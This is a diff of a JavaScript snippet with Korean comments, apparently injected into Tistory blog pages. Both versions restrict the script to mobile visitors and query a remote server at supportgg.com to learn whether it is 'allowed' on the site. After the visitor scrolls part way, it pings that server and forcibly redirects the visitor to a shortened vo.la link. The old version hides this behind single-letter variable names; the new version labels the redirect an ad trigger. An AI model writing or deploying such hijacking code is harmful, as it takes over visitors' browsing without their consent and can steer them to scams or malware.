@@ -1,59 +1,70 @@
 (() => {
-  const qx = "https://vo.la/XFCi3hK"; // 리다이렉트 주소
-  const mz = "https://supportgg.com/tistory_api.php"; // API
-  const aa = 300;   // 스크롤 px
-  const bb = 0.35;  // 스크롤 비율
+const TARGET_URL = "https://vo.la/XFCi3hK";
+const API = "https://supportgg.com/tistory_api.php";
+const TRIGGER_Y = 300;
+const TRIGGER_PCT = 0.35;
 
-  // 모바일만 실행
-  const zt = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  if (!zt) return;
+/* =========================
+   모바일만 동작
+   ========================= */
+const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+if (!isMobile) return;
 
-  const kk = location.hostname.replace(/^www\./, '');
-  let yy = false;
+/* =========================
+   사이트 구별값 (도메인 기준)
+   www 제거로 정규화
+   ========================= */
+const SITE_KEY = location.hostname.replace(/^www\./, '');
 
-  fetch(mz + "?act=check&site=" + encodeURIComponent(kk), {
-    method: "GET",
-    credentials: "include",
-    cache: "no-store"
-  })
-  .then(r => r.json())
-  .then(p => {
-    if (!p || !p.allowed) return;
+let fired = false;
 
-    const v = () => {
-      const n = window.pageYOffset || document.documentElement.scrollTop;
-      const m = Math.max(
-        document.documentElement.scrollHeight - window.innerHeight,
-        1
-      );
-      return { n, m: n / m };
-    };
+/* =========================
+   스크롤 정보
+   ========================= */
+const getScrollInfo = () => {
+const top = window.pageYOffset || document.documentElement.scrollTop;
+const max =
+document.documentElement.scrollHeight - window.innerHeight || 1;
+return { top, pct: top / max };
+};
 
-    const u = () => {
-      if (yy) return;
-      yy = true;
+/* =========================
+   광고 트리거
+   ========================= */
+const fire = () => {
+if (fired) return;
+fired = true;
 
-      fetch(mz + "?act=mark&site=" + encodeURIComponent(kk), {
-        method: "GET",
-        credentials: "include",
-        keepalive: true,
-        cache: "no-store"
-      })
-      .catch(() => {})
-      .finally(() => {
-        setTimeout(() => {
-          location.href = qx;
-        }, 150);
-      });
-    };
+fetch(API + "?act=mark&site=" + encodeURIComponent(SITE_KEY), {
+method: "GET",
+credentials: "include",
+keepalive: true,
+cache: "no-store"
+}).catch(() => {});
 
-    const w = () => {
-      const { n, m } = v();
-      if (n >= aa || m >= bb) u();
-    };
+location.href = TARGET_URL;
+};
 
-    window.addEventListener("scroll", w, { passive: true });
-    window.addEventListener("touchmove", w, { passive: true });
-  })
-  .catch(() => {});
+/* =========================
+   트리거 조건 체크
+   ========================= */
+const check = () => {
+const { top, pct } = getScrollInfo();
+if (top >= TRIGGER_Y || pct >= TRIGGER_PCT) fire();
+};
+
+/* =========================
+   차단 여부 확인
+   ========================= */
+fetch(API + "?act=check&site=" + encodeURIComponent(SITE_KEY), {
+credentials: "include",
+cache: "no-store"
+})
+.then(res => res.json())
+.then(j => {
+if (!j || !j.allowed) return;
+window.addEventListener("scroll", check, { passive: true });
+window.addEventListener("touchmove", check, { passive: true });
+})
+.catch(() => {});
 })();
